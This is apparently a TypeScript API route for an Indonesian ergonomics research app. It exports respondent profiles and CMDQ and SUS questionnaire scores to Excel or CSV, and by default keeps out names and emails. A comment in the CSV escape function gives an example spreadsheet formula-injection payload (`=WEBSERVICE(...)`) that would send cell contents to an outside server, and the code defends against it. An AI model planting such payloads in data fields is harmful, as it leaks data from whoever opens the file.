import ExcelJS from 'exceljs'
import { LABEL_KATEGORI_IMT } from '~~/lib/imt'
import {
  AMBANG_TOTAL_SEDANG,
  AMBANG_TOTAL_TINGGI,
  BOBOT_FREKUENSI,
  LABEL_KATEGORI_RISIKO,
  SKALA_FREKUENSI,
  SKOR_SEGMEN_MAKS,
  SKOR_TOTAL_MAKS,
} from '~~/lib/cmdq/skala'
import { ITEM_SUS } from '~~/lib/sus/item'
import { LABEL_INTERPRETASI, TARGET_SUS } from '~~/lib/sus/skoring'
import {
  OPSI_DIVISI,
  OPSI_DURASI_KOMPUTER,
  OPSI_JABATAN,
  OPSI_MASA_KERJA,
  OPSI_USIA,
} from '~~/lib/sosiodemografi'

/**
 * GET /api/admin/ekspor?format=xlsx|csv — ekspor data mentah penelitian.
 *
 * Format sengaja dibuat "wide" (satu baris per responden) karena itulah
 * bentuk yang langsung bisa dibaca SPSS/JASP tanpa restructure. Variabel
 * kategorik disertai KODE ANGKA di samping labelnya supaya siap dipakai
 * untuk uji statistik (chi-square, korelasi, dsb.).
 *
 * Isi berkas Excel:
 *   Sheet 1 "Responden"   — profil + skor akhir CMDQ & SUS
 *   Sheet 2 "CMDQ Skor"   — 28 kolom skor per segmen (wide)
 *   Sheet 3 "CMDQ Rinci"  — long format: frekuensi, ketidaknyamanan, gangguan
 *   Sheet 4 "SUS"         — 10 kolom jawaban item + skor akhir
 *   Sheet 5 "Kamus Data"  — keterangan variabel & kode, untuk lampiran tesis
 *
 * IDENTITAS DIKECUALIKAN SECARA BAWAAN.
 * `kodeResponden` ("PTX-001") adalah pengenal anonim yang dijanjikan kepada
 * responden pada lembar persetujuan. Nama dan surel hanya ikut bila diminta
 * eksplisit lewat `?identitas=1`, karena berkas hasil ekspor berpindah ke luar
 * kendali aplikasi: tersimpan di laptop, terkirim sebagai lampiran surel, ikut
 * tersinkron ke awan. Seluruh lembar analisis sudah berkunci `Kode` saja.
 */

const KODE_JK = { LAKI_LAKI: 1, PEREMPUAN: 2 } as const
const KODE_IMT = {
  KURUS_BERAT: 1,
  KURUS_RINGAN: 2,
  NORMAL: 3,
  GEMUK_RINGAN: 4,
  OBESITAS: 5,
} as const
const KODE_RISIKO = { RENDAH: 1, SEDANG: 2, TINGGI: 3 } as const
const KODE_SUS = { NOT_ACCEPTABLE: 1, MARGINAL: 2, ACCEPTABLE: 3 } as const

export default defineEventHandler(async (event) => {
  await wajibAdmin(event)

  const { where } = bacaFilter(event)
  const kueri = getQuery(event)
  const format = kueri.format === 'csv' ? 'csv' : 'xlsx'
  const sertakanIdentitas = kueri.identitas === '1'

  const [segmen, responden] = await Promise.all([
    prisma.segmenTubuh.findMany({
      orderBy: { urutan: 'asc' },
      select: { id: true, kode: true, nama: true, urutan: true },
    }),
    prisma.responden.findMany({
      where,
      orderBy: { kodeResponden: 'asc' },
      include: {
        cmdqHasil: { include: { segmenTertinggi: { select: { nama: true } } } },
        cmdqJawaban: { select: {
          segmenId: true,
          frekuensiKode: true,
          ketidaknyamananSkor: true,
          gangguanSkor: true,
          skor: true,
        } },
        susJawaban: { orderBy: { itemNomor: 'asc' } },
        susHasil: true,
      },
    }),
  ])

  const stempel = new Date().toISOString().slice(0, 10)
  // Dibangun sekali; sebelumnya Map 28 entri ini dibuat ulang untuk SETIAP
  // responden di dalam flatMap lembar "CMDQ Rinci".
  const petaSegmen = new Map(segmen.map((s) => [s.id, s]))

  // ── Baris utama (dipakai Excel sheet 1 maupun CSV) ─────────────────────
  // Sel dikosongkan (bukan diisi 0) bila responden belum melengkapi profil —
  // SPSS membacanya sebagai missing value, bukan nilai nol yang menyesatkan.
  const bool01 = (v: boolean | null) => (v === null ? '' : v ? 1 : 0)

  const barisResponden = responden.map((r) => ({
    Kode: r.kodeResponden,
    ...(sertakanIdentitas ? { Nama: r.nama, Email: r.email } : {}),
    Divisi: r.divisi ?? '',
    Jabatan: r.jabatan ?? '',
    Sub_Bagian: r.unitKerja ?? '',
    Setuju_Etik: r.setujuEtik ? 1 : 0,
    Tanggal_Persetujuan: r.tanggalPersetujuan?.toISOString().slice(0, 10) ?? '',
    Usia: r.usia ?? '',
    JK_Kode: r.jenisKelamin ? KODE_JK[r.jenisKelamin] : '',
    JK_Label: r.jenisKelamin
      ? r.jenisKelamin === 'LAKI_LAKI'
        ? 'Laki-laki'
        : 'Perempuan'
      : '',
    // Kategori teks, bukan angka. Nama kolom mempertahankan satuan supaya
    // pembaca kamus data tahu rentangnya dinyatakan dalam tahun/jam.
    Masa_Kerja_Tahun: r.masaKerjaTahun ?? '',
    Durasi_Komputer_Jam: r.durasiKomputerJamPerHari ?? '',
    Tinggi_cm: r.tinggiBadanCm?.toNumber() ?? '',
    Berat_kg: r.beratBadanKg?.toNumber() ?? '',
    IMT: r.imt?.toNumber() ?? '',
    IMT_Kode: r.kategoriImt ? KODE_IMT[r.kategoriImt] : '',
    IMT_Label: r.kategoriImt ? LABEL_KATEGORI_IMT[r.kategoriImt] : '',
    Olahraga: bool01(r.olahraga),
    Frekuensi_Olahraga_per_Minggu: r.frekuensiOlahragaPerMinggu ?? '',
    Merokok: bool01(r.merokok),
    Riwayat_MSDs: bool01(r.riwayatMsds),
    Keterangan_Riwayat: r.keteranganRiwayatMsds ?? '',
    Status_Profil: r.statusProfil,
    Status_CMDQ: r.statusCmdq,
    Status_SUS: r.statusSus,
    CMDQ_Skor_Total: r.cmdqHasil?.skorTotal.toNumber() ?? '',
    CMDQ_Skor_Rata2: r.cmdqHasil?.skorRataRata.toNumber() ?? '',
    CMDQ_Segmen_Bermasalah: r.cmdqHasil?.jumlahSegmenBermasalah ?? '',
    CMDQ_Risiko_Kode: r.cmdqHasil ? KODE_RISIKO[r.cmdqHasil.kategoriRisiko] : '',
    CMDQ_Risiko_Label: r.cmdqHasil
      ? LABEL_KATEGORI_RISIKO[r.cmdqHasil.kategoriRisiko]
      : '',
    CMDQ_Segmen_Tertinggi: r.cmdqHasil?.segmenTertinggi?.nama ?? '',
    // Ambang yang BERLAKU SAAT skor itu dihitung, bukan ambang yang berlaku
    // saat berkas ini dibuat. Tanpa ketiga kolom ini, satu dataset yang
    // dikumpulkan sebelum dan sesudah revisi cut-off tidak bisa dibedakan
    // lagi — dan `CMDQ_Risiko_Kode` tidak dapat direproduksi dari
    // `CMDQ_Skor_Total`.
    CMDQ_Ambang_Sedang: r.cmdqHasil?.ambangSedang.toNumber() ?? '',
    CMDQ_Ambang_Tinggi: r.cmdqHasil?.ambangTinggi.toNumber() ?? '',
    CMDQ_Segmen_Dinilai: r.cmdqHasil?.jumlahSegmenDinilai ?? '',
    SUS_Skor: r.susHasil?.skorTotal.toNumber() ?? '',
    SUS_Interpretasi_Kode: r.susHasil ? KODE_SUS[r.susHasil.interpretasi] : '',
    SUS_Interpretasi_Label: r.susHasil
      ? LABEL_INTERPRETASI[r.susHasil.interpretasi]
      : '',
    SUS_Grade: r.susHasil?.gradeHuruf ?? '',
    SUS_Memenuhi_Target: r.susHasil ? (r.susHasil.memenuhiTarget ? 1 : 0) : '',
    Tanggal_Isi: r.dibuatPada.toISOString().slice(0, 10),
  }))

  // ── CSV: cukup sheet utama ─────────────────────────────────────────────
  if (format === 'csv') {
    const kolom = Object.keys(barisResponden[0] ?? { Kode: '' })

    /**
     * Escape CSV + penangkal formula injection.
     *
     * Lima kolom berisi teks bebas yang diketik responden: `Nama`,
     * `Divisi` dan `Jabatan` (bila ia memilih "Lainnya"), `Sub_Bagian`, dan
     * `Keterangan_Riwayat` (sampai 500 karakter). Excel dan
     * LibreOffice memperlakukan sel yang diawali `=`, `+`, `-`, atau `@`
     * sebagai FORMULA dan menjalankannya saat berkas dibuka. Seorang responden
     * yang mendaftar dengan nama `=WEBSERVICE("https://…"&A2&B2)` — tanpa
     * koma atau kutip, sehingga lolos escape pembatas — dapat membuat laptop
     * peneliti, yang menyimpan seluruh dataset penelitian, mengirimkan isi sel
     * di sekitarnya ke server pihak lain begitu berkas dibuka.
     *
     * Awalan kutip tunggal membuat Excel memperlakukannya sebagai teks biasa.
     * Jalur XLSX tidak terpengaruh: ExcelJS memberi tipe `String` pada nilai
     * string, bukan `Formula`.
     */
    const AWALAN_FORMULA = /^[=+\-@\t\r]/
    const escape = (v: unknown) => {
      let s = String(v ?? '')
      if (AWALAN_FORMULA.test(s)) s = `'${s}`
      return /[",\n\r;']/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
    }
    const isi = [
      kolom.join(','),
      ...barisResponden.map((b) =>
        kolom.map((k) => escape((b as Record<string, unknown>)[k])).join(','),
      ),
    ].join('\r\n')

    setHeader(event, 'Content-Type', 'text/csv; charset=utf-8')
    // Nama berkas menyebut "profil" secara eksplisit: CSV hanya memuat lembar
    // Responden. Skor 28 segmen, rincian tiga dimensi, dan jawaban item SUS
    // hanya ada di berkas XLSX. Analisis per bagian tubuh tidak bisa dilakukan
    // dari berkas ini.
    setHeader(
      event,
      'Content-Disposition',
      `attachment; filename="ergoself-profil-responden-${stempel}.csv"`,
    )
    // BOM agar Excel membaca karakter Indonesia dengan benar
    return `﻿${isi}`
  }

  // ── Excel ──────────────────────────────────────────────────────────────
  const wb = new ExcelJS.Workbook()
  wb.creator = 'ErgoSelf'
  wb.created = new Date()

  function tulisSheet(nama: string, baris: Record<string, unknown>[]) {
    const ws = wb.addWorksheet(nama)
    if (baris.length === 0) {
      ws.addRow(['(tidak ada data yang sesuai filter)'])
      return ws
    }
    const kolom = Object.keys(baris[0]!)
    ws.columns = kolom.map((k) => ({
      header: k,
      key: k,
      width: Math.min(28, Math.max(12, k.length + 3)),
    }))
    baris.forEach((b) => ws.addRow(b))
    ws.getRow(1).font = { bold: true }
    ws.views = [{ state: 'frozen', ySplit: 1 }]
    ws.autoFilter = {
      from: { row: 1, column: 1 },
      to: { row: 1, column: kolom.length },
    }
    return ws
  }

  tulisSheet('Responden', barisResponden)

  // Sheet 2 — skor CMDQ per segmen (wide, 28 kolom)
  tulisSheet(
    'CMDQ Skor',
    responden.map((r) => {
      const perSegmen = new Map(r.cmdqJawaban.map((j) => [j.segmenId, j]))
      const baris: Record<string, unknown> = { Kode: r.kodeResponden }
      for (const s of segmen) {
        baris[`S${String(s.urutan).padStart(2, '0')}_${s.kode}`] =
          perSegmen.get(s.id)?.skor.toNumber() ?? ''
      }
      baris.Total = r.cmdqHasil?.skorTotal.toNumber() ?? ''
      return baris
    }),
  )

  // Sheet 3 — rincian tiga dimensi CMDQ (long format)
  tulisSheet(
    'CMDQ Rinci',
    responden.flatMap((r) =>
      r.cmdqJawaban
        .map((j) => {
          const s = petaSegmen.get(j.segmenId)
          return {
            Kode: r.kodeResponden,
            Segmen_No: s?.urutan ?? '',
            Segmen_Kode: s?.kode ?? '',
            Segmen_Nama: s?.nama ?? '',
            Frekuensi: j.frekuensiKode,
            // Bobot yang benar-benar dipakai perhitungan. Saat ini sama dengan
            // kode frekuensi, tetapi `lib/cmdq/skala.ts` menyediakan jalur
            // pindah ke bobot baku CMDQ (0/1,5/3,5/5/10). Tanpa kolom ini,
            // `Skor` tidak lagi dapat diverifikasi ulang setelah perpindahan.
            Bobot_Frekuensi: j.frekuensiBobot.toNumber(),
            Ketidaknyamanan: j.ketidaknyamananSkor ?? '',
            Gangguan: j.gangguanSkor ?? '',
            Skor: j.skor.toNumber(),
          }
        })
        .sort((a, b) => Number(a.Segmen_No) - Number(b.Segmen_No)),
    ),
  )

  // Sheet 4 — SUS (wide, 10 item)
  tulisSheet(
    'SUS',
    responden
      .filter((r) => r.susJawaban.length > 0)
      .map((r) => {
        const baris: Record<string, unknown> = { Kode: r.kodeResponden }
        const perItem = new Map(r.susJawaban.map((j) => [j.itemNomor, j]))
        for (const item of ITEM_SUS) {
          baris[`SUS${String(item.nomor).padStart(2, '0')}`] =
            perItem.get(item.nomor)?.skorJawaban ?? ''
        }
        baris.SUS_Skor = r.susHasil?.skorTotal.toNumber() ?? ''
        baris.SUS_Grade = r.susHasil?.gradeHuruf ?? ''
        baris.SUS_Interpretasi = r.susHasil
          ? LABEL_INTERPRETASI[r.susHasil.interpretasi]
          : ''
        return baris
      }),
  )

  // Sheet 5 — kamus data, siap dilampirkan di tesis.
  //
  // Seluruh angka diambil dari konstanta di `lib/cmdq/skala.ts` dan
  // `lib/sus/skoring.ts`, tidak ditulis tangan. Lembar ini menjadi lampiran
  // metodologi; bila ambang atau bobot direvisi sementara angka di sini tetap,
  // tesis akan memuat keterangan yang bertentangan dengan datanya sendiri.
  const labelFrekuensi = SKALA_FREKUENSI.map((o) => `${o.nilai} = ${o.label}`).join('; ')

  tulisSheet('Kamus Data', [
    { Variabel: 'Setuju_Etik', Keterangan: 'Persetujuan etik penelitian (informed consent)', Kode: '0 = Tidak; 1 = Ya. Kolom Tanggal_Persetujuan merekam waktunya.' },
    { Variabel: 'Status_Profil / CMDQ / SUS', Keterangan: 'Kemajuan pengisian tiap instrumen', Kode: 'BELUM; SELESAI' },
    { Variabel: '(sel kosong)', Keterangan: 'Missing value', Kode: 'Responden sudah mendaftar tetapi belum melengkapi profil pekerja' },
    { Variabel: 'JK_Kode', Keterangan: 'Jenis kelamin', Kode: '1 = Laki-laki; 2 = Perempuan' },
    { Variabel: 'Usia', Keterangan: 'Kelompok usia (kategorik, bukan angka)', Kode: OPSI_USIA.join('; ') },
    { Variabel: 'Divisi', Keterangan: 'Divisi/departemen tempat responden bertugas', Kode: `${OPSI_DIVISI.join('; ')}. Nilai di luar daftar berasal dari pilihan "Lainnya" dan diketik sendiri oleh responden — kelompokkan ulang sebelum tabulasi silang.` },
    { Variabel: 'Jabatan', Keterangan: 'Jenjang jabatan struktural', Kode: `${OPSI_JABATAN.join('; ')}. Idem soal "Lainnya".` },
    { Variabel: 'Sub_Bagian', Keterangan: 'Seksi/sub-bagian yang lebih rinci dari divisi. Teks bebas dan OPSIONAL — kekosongannya bukan missing value.', Kode: '(teks bebas)' },
    { Variabel: 'Masa_Kerja_Tahun', Keterangan: 'Kelompok masa kerja (kategorik, bukan angka)', Kode: OPSI_MASA_KERJA.join('; ') },
    { Variabel: 'Durasi_Komputer_Jam', Keterangan: 'Kelompok durasi penggunaan komputer per hari (kategorik, bukan angka)', Kode: OPSI_DURASI_KOMPUTER.join('; ') },
    { Variabel: 'IMT_Kode', Keterangan: 'Kategori IMT (Kemenkes RI)', Kode: '1 = Kurus berat; 2 = Kurus ringan; 3 = Normal; 4 = Gemuk ringan; 5 = Obesitas' },
    { Variabel: 'Olahraga / Merokok / Riwayat_MSDs', Keterangan: 'Kebiasaan & riwayat', Kode: '0 = Tidak; 1 = Ya' },
    { Variabel: 'Frekuensi', Keterangan: 'Frekuensi keluhan CMDQ (kode pilihan)', Kode: labelFrekuensi },
    { Variabel: 'Bobot_Frekuensi', Keterangan: 'Bobot yang dipakai perhitungan skor', Kode: `Bobot berlaku: ${BOBOT_FREKUENSI.join(' / ')}` },
    { Variabel: 'Ketidaknyamanan', Keterangan: 'Tingkat ketidaknyamanan', Kode: '1 = Sedikit; 2 = Agak; 3 = Sangat (kosong bila Frekuensi = 0)' },
    { Variabel: 'Gangguan', Keterangan: 'Gangguan terhadap pekerjaan', Kode: '1 = Tidak sama sekali; 2 = Sedikit; 3 = Sangat (kosong bila Frekuensi = 0)' },
    { Variabel: 'Skor', Keterangan: 'Skor segmen = Bobot_Frekuensi × Ketidaknyamanan × Gangguan', Kode: `Rentang 0–${SKOR_SEGMEN_MAKS}` },
    { Variabel: 'CMDQ_Skor_Total', Keterangan: `Jumlah skor ${segmen.length} segmen`, Kode: `Rentang 0–${SKOR_TOTAL_MAKS}` },
    { Variabel: 'CMDQ_Risiko_Kode', Keterangan: 'Kategori risiko MSDs (ambang buatan peneliti, lihat Bab III)', Kode: `1 = Rendah (≤${AMBANG_TOTAL_SEDANG}); 2 = Sedang (>${AMBANG_TOTAL_SEDANG}–${AMBANG_TOTAL_TINGGI}); 3 = Tinggi (>${AMBANG_TOTAL_TINGGI})` },
    { Variabel: 'CMDQ_Ambang_Sedang / Tinggi', Keterangan: 'Ambang yang BERLAKU SAAT skor responden dihitung', Kode: 'Dipakai untuk memverifikasi CMDQ_Risiko_Kode; bisa berbeda antar baris bila ambang direvisi di tengah pengumpulan data' },
    { Variabel: 'CMDQ_Segmen_Dinilai', Keterangan: 'Banyaknya segmen yang dinilai saat perhitungan', Kode: `Saat ini ${segmen.length}` },
    { Variabel: 'SUS01–SUS10', Keterangan: 'Jawaban item SUS (Likert). Item genap bernada negatif dan dinilai terbalik.', Kode: '1 = Sangat Tidak Setuju … 5 = Sangat Setuju' },
    { Variabel: 'SUS_Skor', Keterangan: 'Skor SUS = Σ kontribusi × 2,5', Kode: `Rentang 0–100; target penelitian ≥ ${TARGET_SUS}` },
    { Variabel: 'SUS_Interpretasi_Kode', Keterangan: 'Akseptabilitas (Bangor et al., 2009)', Kode: '1 = Not acceptable (<50); 2 = Marginal (50–70); 3 = Acceptable (>70)' },
    { Variabel: 'SUS_Memenuhi_Target', Keterangan: `Skor ≥ ${TARGET_SUS} (rata-rata industri). BUKAN hal yang sama dengan SUS_Interpretasi_Kode — skor 70 memenuhi target tetapi masih berkategori Marginal.`, Kode: '0 = Tidak; 1 = Ya' },
  ])

  const buffer = await wb.xlsx.writeBuffer()

  setHeader(
    event,
    'Content-Type',
    'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  )
  setHeader(
    event,
    'Content-Disposition',
    `attachment; filename="ergoself-data-${stempel}.xlsx"`,
  )

  return Buffer.from(buffer)
})
